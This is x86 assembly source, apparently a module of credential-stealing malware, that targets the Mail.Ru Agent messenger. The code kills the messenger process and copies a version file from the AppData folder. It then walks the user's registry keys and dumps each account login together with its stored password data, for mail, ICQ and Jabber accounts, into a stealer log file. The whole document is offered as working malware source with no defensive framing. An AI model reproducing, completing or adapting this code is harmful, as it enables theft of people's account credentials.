     MRA_MAIL        equ 0
     MRA_ICQ         equ 1
     
     
.data?
     align 4
     mra_appdata             db 200h dup (?)
     mra_buf1                db 400h dup (?)
     mra_buf2                db 400h dup (?)
     mra_val_RegValName      db 400h dup (?)
     mra_val_Data            db 400h dup (?)
     
.code

GetMRAPwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], MRA_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetMRAPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      push    offset mra_exe
      call    KillProcessW
      
      push    offset mra_str1
      call    GetVerTxtToLog
      test    eax, eax
      je      mra_ver_txt_get_failed
      
      push    offset mra_reg2
      call    GrabAccountsFromRegistry
    mra_ver_txt_get_failed:
      
    GetMRAPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetMRAPwd endp

GrabAccountsFromRegistry proc pregpath:DWORD
     LOCAL   mkey           :DWORD
     LOCAL   index          :DWORD
     LOCAL   mbufsize       :DWORD
     LOCAL   nr             :DWORD
     LOCAL   pwdlen         :DWORD
     LOCAL   binlen         :DWORD
     LOCAL   acc_cnt        :DWORD
     LOCAL   enum_val_index :DWORD
     LOCAL   hKey2          :DWORD
     LOCAL   mra_val_enum_RegDataSize :DWORD
     LOCAL   mra_val_RegValNameSize   :DWORD
     
     mov     dword ptr [acc_cnt], 0
     
     lea     eax, mkey
     push    eax
     push    KEY_READ
     push    0
     push    dword ptr [pregpath]
     push    HKEY_CURRENT_USER
     call    dword ptr [_RegOpenKeyExW]
     test    eax, eax
     jne     mra_reg_total_failed
     
     mov     dword ptr [index], 0
    mra_enum_loop:
     mov     mbufsize, sizeof mra_buf1
     xor     eax, eax
     push    eax
     push    eax
     push    eax
     push    eax
     lea     eax, mbufsize
     push    eax
     push    offset mra_buf1
     push    dword ptr [index]
     push    dword ptr [mkey]
     call    dword ptr [_RegEnumKeyExW]
     cmp     eax, ERROR_NO_MORE_ITEMS
     je      all_mra_key_done
     inc     dword ptr [index]
     
     lstrcpyW, addr mra_buf2, pregpath
     lstrcatW, addr mra_buf2, addr slW
     lstrcatW, addr mra_buf2, addr mra_buf1
     
     ; ValName = '####password'
     invoke  RegRead, HKEY_CURRENT_USER, addr mra_buf2, addr mra_reg3, addr mra_val_Data, sizeof mra_val_Data, REG_READ_W_W
     mov     mra_val_enum_RegDataSize, eax
     test    eax, eax
     je      mra_failed_2
     ; Write dword - type
     mov     dword ptr [pwdlen], MRA_MAIL
     add     dword ptr [DataSize], sizeof pwdlen
     WriteFile, stfile, addr pwdlen, sizeof pwdlen, addr SNW, NULL
     ; Write Login
     lstrlenW, addr mra_buf1
     imul    eax, eax, 2
     mov     dword ptr [pwdlen], eax
     add     dword ptr [DataSize], sizeof pwdlen
     WriteFile, stfile, addr pwdlen, sizeof pwdlen, addr SNW, NULL
     mov     eax, dword ptr [pwdlen]
     add     dword ptr [DataSize], eax
     WriteFile, stfile, addr mra_buf1, pwdlen, addr SNW, NULL
     ; Write Pwd
     add     dword ptr [DataSize], sizeof mra_val_enum_RegDataSize
     WriteFile, stfile, addr mra_val_enum_RegDataSize, sizeof mra_val_enum_RegDataSize, addr SNW, NULL
     mov     eax, dword ptr [mra_val_enum_RegDataSize]
     .if     eax != 0
             add     dword ptr [DataSize], eax
             WriteFile, stfile, addr mra_val_Data, mra_val_enum_RegDataSize, addr SNW, NULL
     .endif
     inc     dword ptr [acc_cnt]
     
     ; Check other Accounts
     lea     eax, hKey2
     push    eax
     push    KEY_READ
     push    0
     push    offset mra_buf2
     push    HKEY_CURRENT_USER
     call    dword ptr [_RegOpenKeyExW]
     test    eax, eax
     jne     mra_val_enum_total_failed
     mov     dword ptr [enum_val_index], 0
   mra_enum_val_lp:
     mov     dword ptr [mra_val_RegValNameSize], sizeof mra_val_RegValName
     mov     dword ptr [mra_val_enum_RegDataSize], sizeof mra_val_Data
     lea     eax, mra_val_enum_RegDataSize
     push    eax
     push    offset mra_val_Data
     xor     eax, eax
     push    eax
     push    eax
     lea     eax, mra_val_RegValNameSize
     push    eax
     push    offset mra_val_RegValName
     push    dword ptr [enum_val_index]
     push    dword ptr [hKey2]
     call    _RegEnumValueW
     cmp     eax, ERROR_NO_MORE_ITEMS
     je      mra_val_enum_all_reg_done
     test    eax, eax
     jne     mra_val_enum_badval
     cmp     dword ptr [mra_val_enum_RegDataSize], 0
     je      mra_val_enum_badval
     
   mra_first_val_good:
     ; if ValName = 'ICQ'/'Jabber'
     mov     eax, dword ptr [mra_val_RegValName]
     mov     eax, dword ptr [mra_val_RegValName+4]
     .if     ( eax != 00230023h ) && ( ecx != 00230023h ) ; other accounts, '####' in unicode
             ; Write dword - type
             mov     dword ptr [pwdlen], MRA_ICQ
             add     dword ptr [DataSize], sizeof pwdlen
             WriteFile, stfile, addr pwdlen, sizeof pwdlen, addr SNW, NULL
             ; Write Login
             lstrlenW, addr mra_val_RegValName
             imul    eax, eax, 2
             mov     dword ptr [pwdlen], eax
             add     dword ptr [DataSize], sizeof pwdlen
             WriteFile, stfile, addr pwdlen, sizeof pwdlen, addr SNW, NULL
             mov     eax, dword ptr [pwdlen]
             add     dword ptr [DataSize], eax
             WriteFile, stfile, addr mra_val_RegValName, pwdlen, addr SNW, NULL
             ; Write Pwd
             add     dword ptr [DataSize], sizeof mra_val_enum_RegDataSize
             WriteFile, stfile, addr mra_val_enum_RegDataSize, sizeof mra_val_enum_RegDataSize, addr SNW, NULL
             mov     eax, dword ptr [mra_val_enum_RegDataSize]
             .if     eax != 0
                     add     dword ptr [DataSize], eax
                     WriteFile, stfile, addr mra_val_Data, mra_val_enum_RegDataSize, addr SNW, NULL
             .endif
             inc     dword ptr [acc_cnt]
     .endif
     
   mra_val_enum_badval:
     inc     dword ptr [enum_val_index]
     jmp     mra_enum_val_lp
   mra_val_enum_all_reg_done:
     push    dword ptr [hKey2]
     call    dword ptr [_RegCloseKey]
   mra_val_enum_total_failed:
     
mra_failed_2:
     jmp     mra_enum_loop
all_mra_key_done:
     push    dword ptr [mkey]
     call    dword ptr [_RegCloseKey]
mra_reg_total_failed:
     
     ; write number of accounts
     add     dword ptr [DataSize], sizeof acc_cnt
     WriteFile, stfile, addr acc_cnt, sizeof acc_cnt, addr SNW, NULL
     
     mov     eax, 1
     jmp     mra_ToExit
     
     xor     eax, eax
mra_ToExit:
     ret
GrabAccountsFromRegistry endp

GetVerTxtToLog proc ppath:DWORD
      LOCAL   mra_hfile      :DWORD
      LOCAL   vertxt_Size    :DWORD
      LOCAL   hvertxt        :DWORD
      LOCAL   nr             :DWORD
      
      push    0
      push    CSIDL_APPDATA
      push    offset mra_appdata
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      
      push    offset mra_appdata
      call    dword ptr [_PathAddBackslash]
      
      lstrcat, addr mra_appdata, ppath
      
      CreateFile, addr mra_appdata, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
      cmp     eax, INVALID_HANDLE_VALUE
      je      mra_Total_Fail
      mov     mra_hfile, eax
      
      GetFileSize, mra_hfile, 0
      test    eax, eax
      je      mra_ZeroSize
      mov     vertxt_Size, eax
      
      VirtualAlloc, 0, vertxt_Size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
      test    eax, eax
      je      mra_ZeroSize
      mov     hvertxt, eax
      SetFilePointer, mra_hfile, 0, 0, FILE_BEGIN
      .if     eax == INVALID_SET_FILE_POINTER
              jmp     mra_ReadShit
      .endif
      ReadFile, mra_hfile, hvertxt, vertxt_Size, addr nr, NULL
      .if     eax == 0
              jmp     mra_ReadShit
      .endif
      
      add     dword ptr [DataSize], sizeof vertxt_Size
      WriteFile, stfile, addr vertxt_Size, sizeof vertxt_Size, addr SNW, NULL
      mov     eax, dword ptr [vertxt_Size]
      add     dword ptr [DataSize], eax
      WriteFile, stfile, hvertxt, vertxt_Size, addr SNW, NULL
      
      VirtualFree, hvertxt, 0, MEM_RELEASE
      CloseHandle, mra_hfile
      mov     eax, 1
      jmp     mra_ToExit
      
mra_ReadShit:
      VirtualFree, hvertxt, 0, MEM_RELEASE
mra_ZeroSize:
      CloseHandle, mra_hfile
mra_Total_Fail:
      xor     eax, eax
mra_ToExit:
      ret
GetVerTxtToLog endp
